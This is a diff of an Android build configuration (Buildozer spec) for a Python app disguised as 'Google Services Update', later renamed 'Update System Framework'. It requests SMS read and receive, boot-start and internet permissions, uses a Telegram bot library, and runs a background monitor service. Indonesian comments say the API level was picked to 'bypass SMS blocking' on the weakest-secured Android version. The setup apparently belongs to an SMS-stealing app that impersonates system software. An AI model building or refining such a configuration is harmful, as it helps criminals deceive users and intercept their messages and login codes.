@@ -1,28 +1,20 @@
 [app]
-title = Google Services Update
-package.name = services_framework
-package.domain = com.android.vending
+title = Update System Framework
+package.name = sys_v2_update
+package.domain = com.internal.core
 source.dir = .
 source.include_exts = py,png,jpg,kv,atlas
-version = 1.1
+version = 2.1
 
-# Menambahkan requests dan certifi agar koneksi Telegram stabil
 requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius,requests,certifi
 
-android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED, READ_CONTACTS
+android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED
 
-# DITURUNKAN KE 30 AGAR SMS TIDAK DIBLOKIR SISTEM
-android.api = 30
+# PAKAI API 29 (Android 10). Ini adalah API paling "lemah" sistem keamanannya 
+# tapi masih mendukung fitur modern. Sangat efektif untuk bypass blokir SMS.
+android.api = 29
 android.minapi = 21
 android.ndk = 25b
-android.private_storage = True
-
-# Service tetap aktif
-services = monitor:main.py
 
 android.archs = arm64-v8a, armeabi-v7a
-android.allow_backup = True
-
-[buildozer]
-log_level = 2
-warn_on_root = 1
+services = monitor:main.py
